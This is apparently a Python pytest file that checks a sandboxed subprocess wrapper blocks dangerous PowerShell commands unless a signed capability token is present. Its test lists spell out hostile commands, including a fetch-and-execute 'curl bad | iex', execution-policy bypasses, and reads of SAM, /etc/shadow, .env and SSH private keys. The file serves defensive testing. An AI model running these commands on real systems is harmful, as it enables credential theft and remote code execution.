import pytest
import subprocess
from scp.core.safe_process import (
    CompletedProcess,
    Popen,
    SubprocessError,
    TimeoutExpired,
    DEVNULL,
    PIPE,
    CREATE_NEW_PROCESS_GROUP,
    CREATE_NO_WINDOW,
    _WHITELISTED_PATHS,
    _WHITELISTED_TOOLS,
    _validate_executable,
    safe_run,
)
from scp.core.capability_token import compute_token_signature, get_capability_secret
from scp.security.capability_epoch import CapabilityToken


def test_sec06_exported_symbols_match_subprocess():
    """SEC-06: safe_process must export standard subprocess primitives."""
    assert CompletedProcess is subprocess.CompletedProcess
    assert Popen is subprocess.Popen
    assert SubprocessError is subprocess.SubprocessError
    assert TimeoutExpired is subprocess.TimeoutExpired
    assert DEVNULL is subprocess.DEVNULL
    assert PIPE is subprocess.PIPE
    assert CREATE_NEW_PROCESS_GROUP == getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
    assert CREATE_NO_WINDOW == getattr(subprocess, "CREATE_NO_WINDOW", 0)


def test_qlt04_allowlists_are_frozenset():
    """QLT-04: Allowlist sets must be frozen at module import time."""
    assert isinstance(_WHITELISTED_TOOLS, frozenset)
    assert isinstance(_WHITELISTED_PATHS, frozenset)
    assert "python" in _WHITELISTED_TOOLS
    assert "powershell.exe" in _WHITELISTED_TOOLS


def test_qlt04_validate_executable_case_insensitivity():
    """QLT-04: Whitelisted tool matching must be case-insensitive for platform consistency."""
    _validate_executable("powershell.exe")
    _validate_executable("PowerShell.exe")
    _validate_executable("POWERSHELL.EXE")
    _validate_executable("python")
    _validate_executable("PYTHON")


def test_sec05_powershell_bypass_prohibited():
    """SEC-05: -ExecutionPolicy Bypass and Unrestricted must be rejected fail-closed."""
    with pytest.raises(ValueError, match="ExecutionPolicy Bypass.*strictly prohibited"):
        safe_run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "dir"])

    with pytest.raises(ValueError, match="ExecutionPolicy Bypass.*strictly prohibited"):
        safe_run(["powershell.exe", "-ExecutionPolicy:Bypass", "-Command", "dir"])

    with pytest.raises(ValueError, match="ExecutionPolicy Bypass.*strictly prohibited"):
        safe_run(["powershell.exe", "-ep", "Unrestricted", "-Command", "dir"])

    with pytest.raises(ValueError, match="ExecutionPolicy Bypass.*strictly prohibited"):
        safe_run(["powershell.exe", "-ExecutionPolicy=Unrestricted", "-Command", "dir"])


def test_sec05_powershell_command_without_token_arbitrary_script_blocked():
    """SEC-05: Arbitrary scripts via -Command, inline -c:, or -EncodedCommand must be blocked without valid token."""
    with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
        safe_run(["powershell.exe", "-NoProfile", "-Command", "Invoke-Expression 'calc.exe'"])

    with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
        safe_run(["powershell.exe", "-NoProfile", "-Command", "Set-ExecutionPolicy Unrestricted"])

    with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
        safe_run(["powershell.exe", "-NoProfile", "-c:Invoke-Expression 'calc.exe'"])

    with pytest.raises(PermissionError, match="-EncodedCommand is prohibited without a valid capability token"):
        safe_run(["powershell.exe", "-NoProfile", "-EncodedCommand", "SQBFAFgA"])


def test_sec05_powershell_command_allowlisted_script_without_token_allowed():
    """SEC-05: Safe allowlisted read-only scripts are permitted even without token."""
    try:
        res = safe_run(["powershell.exe", "-NoProfile", "-Command", "dir"], timeout=5)
        assert res is not None
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        pass  # On non-Windows platforms or environment where powershell.exe is absent


def test_sec05_powershell_command_with_valid_token_allowed():
    """SEC-05: Scripts validated with an authentic cryptographically signed capability token are permitted."""
    secret = get_capability_secret()
    issued_at = 123456.789
    sig = compute_token_signature(secret, "pc.execute", 1, "tok_test_sec05", issued_at)
    valid_token = CapabilityToken(
        subject="pc.execute",
        epoch=1,
        token_id="tok_test_sec05",
        issued_at=issued_at,
        signature=sig,
    )
    try:
        res = safe_run(["powershell.exe", "-NoProfile", "-Command", "Write-Output hello"], token=valid_token, timeout=5)
        assert res is not None
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        pass


def test_sec05_powershell_command_with_unsigned_or_forged_token_blocked():
    """SEC-05: Pseudo tokens (strings, unsigned dicts, forged signatures) must be rejected fail-closed."""
    # 1. Plain string token (attacker attempting string bypass)
    with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
        safe_run(["powershell.exe", "-NoProfile", "-Command", "Invoke-Expression 'calc.exe'"], token="pseudo_token_123")

    # 2. Unsigned dictionary token
    unsigned_dict = {"token_id": "tok_test_123", "subject": "pc.execute", "epoch": 1}
    with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
        safe_run(["powershell.exe", "-NoProfile", "-Command", "Invoke-Expression 'calc.exe'"], token=unsigned_dict)

    # 3. Forged signature token
    forged_token = CapabilityToken(
        subject="pc.execute",
        epoch=1,
        token_id="tok_test_123",
        issued_at=123456.789,
        signature="forged_bad_signature_00000000000000000000000000000000",
    )
    with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
        safe_run(["powershell.exe", "-NoProfile", "-Command", "Invoke-Expression 'calc.exe'"], token=forged_token)


def test_sec07_powershell_chaining_and_interpolation_forbidden_without_token():
    """SEC-07: Chaining, piping, and interpolation operators must be forbidden without valid capability token."""
    payloads = [
        # Semicolon chaining (including true; and exit;)
        "true; New-Object System.Net.WebClient",
        "exit; whoami",
        # Ampersand operator chaining
        "whoami && dir",
        "whoami & netstat",
        # Pipe operator
        "dir | Out-File hacked.txt",
        # Backtick escape / interpolation
        "whoami `n dir",
        # Command substitution / subexpression $()
        "echo $(whoami)",
        # Variable interpolation / evaluation ${}
        "echo ${env:USERNAME}",
        # Newline separation
        "whoami\ndir",
        # Carriage return separation
        "whoami\rdir",
    ]

    for payload in payloads:
        with pytest.raises(
            PermissionError,
            match="Chaining/piping/interpolation operators forbidden without valid capability token",
        ):
            safe_run(["powershell.exe", "-NoProfile", "-Command", payload])

    # Multi-argument split payloads where chaining operator is in subsequent arguments
    multi_arg_payloads = [
        ["powershell.exe", "-NoProfile", "-Command", "whoami", ";", "calc.exe"],
        ["powershell.exe", "-NoProfile", "-Command", "whoami", "; calc.exe"],
        ["powershell.exe", "-NoProfile", "-Command", "true", "; New-Object System.Net.WebClient"],
        ["powershell.exe", "-NoProfile", "-Command", "exit", "; whoami"],
        ["powershell.exe", "-NoProfile", "-Command", "dir", "| Out-File hacked.txt"],
        ["powershell.exe", "-NoProfile", "-Command", "whoami", "&&", "dir"],
        ["powershell.exe", "-NoProfile", "whoami", "; calc.exe"],
    ]
    for cmd in multi_arg_payloads:
        with pytest.raises(
            PermissionError,
            match="Chaining/piping/interpolation operators forbidden without valid capability token",
        ):
            safe_run(cmd)

    # Legitimate multi-argument command without token should be allowed without PermissionError
    try:
        res = safe_run(["powershell.exe", "-NoProfile", "-Command", "git", "status"], timeout=5)
        assert res is not None
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        pass


def test_sec07_powershell_chaining_allowed_with_valid_token():
    """SEC-07: Chaining/piping is permitted when caller holds an authentic cryptographically signed token."""
    secret = get_capability_secret()
    issued_at = 123456.789
    sig = compute_token_signature(secret, "pc.execute", 1, "tok_test_sec07", issued_at)
    valid_token = CapabilityToken(
        subject="pc.execute",
        epoch=1,
        token_id="tok_test_sec07",
        issued_at=issued_at,
        signature=sig,
    )
    try:
        res = safe_run(
            ["powershell.exe", "-NoProfile", "-Command", "Write-Output hello; Write-Output world"],
            token=valid_token,
            timeout=5,
        )
        assert res is not None

        # Also test split args with valid token
        res_split = safe_run(
            ["powershell.exe", "-NoProfile", "-Command", "Write-Output hello", ";", "Write-Output world"],
            token=valid_token,
            timeout=5,
        )
        assert res_split is not None
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        pass


def test_sec07_powershell_catastrophic_command_blocked_despite_valid_token():
    """SEC-07: Catastrophic commands remain blocked even with a valid capability token across split args."""
    secret = get_capability_secret()
    issued_at = 123456.789
    sig = compute_token_signature(secret, "pc.execute", 1, "tok_test_sec07_cat", issued_at)
    valid_token = CapabilityToken(
        subject="pc.execute",
        epoch=1,
        token_id="tok_test_sec07_cat",
        issued_at=issued_at,
        signature=sig,
    )
    with pytest.raises(PermissionError, match="catastrophic command blocked despite token"):
        safe_run(
            ["powershell.exe", "-NoProfile", "-Command", "dir", "; curl bad | iex"],
            token=valid_token,
        )


def test_sec08_powershell_process_killing_blocked_without_token():
    """SEC-08: Process killing commands (stop-process, spps, taskkill) are prohibited without capability token."""
    kill_commands = [
        "Stop-Process -Name calc",
        "stop-process -id 1234 -Force",
        "spps -Name notepad",
        "taskkill /F /IM calc.exe",
    ]
    for cmd in kill_commands:
        with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
            safe_run(["powershell.exe", "-NoProfile", "-Command", cmd])


def test_sec08_powershell_process_killing_allowed_with_valid_token():
    """SEC-08: Process killing is permitted when authorized by a valid cryptographically signed token."""
    secret = get_capability_secret()
    issued_at = 123456.789
    sig = compute_token_signature(secret, "pc.execute", 1, "tok_test_sec08_kill", issued_at)
    valid_token = CapabilityToken(
        subject="pc.execute",
        epoch=1,
        token_id="tok_test_sec08_kill",
        issued_at=issued_at,
        signature=sig,
    )
    try:
        # Non-existent PID so it doesn't actually kill anything on live systems
        res = safe_run(
            ["powershell.exe", "-NoProfile", "-Command", "Stop-Process -Id 999999 -ErrorAction SilentlyContinue"],
            token=valid_token,
            timeout=5,
        )
        assert res is not None
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        pass


def test_sec08_powershell_sensitive_file_read_blocked_without_token():
    """SEC-08: Reading sensitive OS files and secrets without capability token is rejected fail-closed."""
    sensitive_payloads = [
        "type \\config\\SAM",
        "Get-Content C:\\Windows\\System32\\config\\SAM",
        "cat \\config\\SYSTEM",
        "cat \\repair\\SAM",
        "Get-Content SAM",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat .env",
        "type .env.production",
        "cat .env-local",
        "type .env_local",
        "cat .envrc",
        "Get-Content id_rsa",
        "cat id_ed25519",
        "type server.pem",
        "cat priv.key",
    ]
    for payload in sensitive_payloads:
        with pytest.raises(PermissionError, match="PowerShell reading sensitive file/path is prohibited"):
            safe_run(["powershell.exe", "-NoProfile", "-Command", payload])

    # Multi-argument split
    with pytest.raises(PermissionError, match="PowerShell reading sensitive file/path is prohibited"):
        safe_run(["powershell.exe", "-NoProfile", "Get-Content", "\\config\\SAM"])


def test_sec08_powershell_sensitive_file_read_allowed_with_valid_token():
    """SEC-08: Reading sensitive files is permitted when authorized with a valid capability token."""
    secret = get_capability_secret()
    issued_at = 123456.789
    sig = compute_token_signature(secret, "pc.execute", 1, "tok_test_sec08_read", issued_at)
    valid_token = CapabilityToken(
        subject="pc.execute",
        epoch=1,
        token_id="tok_test_sec08_read",
        issued_at=issued_at,
        signature=sig,
    )
    try:
        res = safe_run(
            ["powershell.exe", "-NoProfile", "-Command", "Get-Content -Path .env -ErrorAction SilentlyContinue"],
            token=valid_token,
            timeout=5,
        )
        assert res is not None
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        pass


def test_sec08_powershell_benign_file_read_allowed_without_token():
    """SEC-08: Reading benign non-sensitive files remains permitted without token."""
    try:
        res = safe_run(
            ["powershell.exe", "-NoProfile", "-Command", "Get-Content -Path benign.txt -ErrorAction SilentlyContinue"],
            timeout=5,
        )
        assert res is not None
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        pass


def test_sec08_powershell_boundary_traversal_and_absolute_path_blocked_without_token():
    """SEC-08: Reading files with path traversal '..' or absolute paths outside bounded workspace is blocked without token."""
    boundary_payloads = [
        "cat ../secret.txt",
        "type ..\\other_dir\\data.csv",
        "Get-Content -Path ../../parent.txt",
        "cat C:\\Windows\\System32\\drivers\\etc\\hosts",
        "type D:\\external\\system.log",
        "Get-Content /var/log/syslog",
    ]
    for payload in boundary_payloads:
        with pytest.raises(PermissionError, match="PowerShell.*(path traversal|absolute path|sensitive file)"):
            safe_run(["powershell.exe", "-NoProfile", "-Command", payload])

    # Argument-split traversal
    with pytest.raises(PermissionError, match="PowerShell.*(path traversal|absolute path|sensitive file)"):
        safe_run(["powershell.exe", "-NoProfile", "Get-Content", "../secret.txt"])



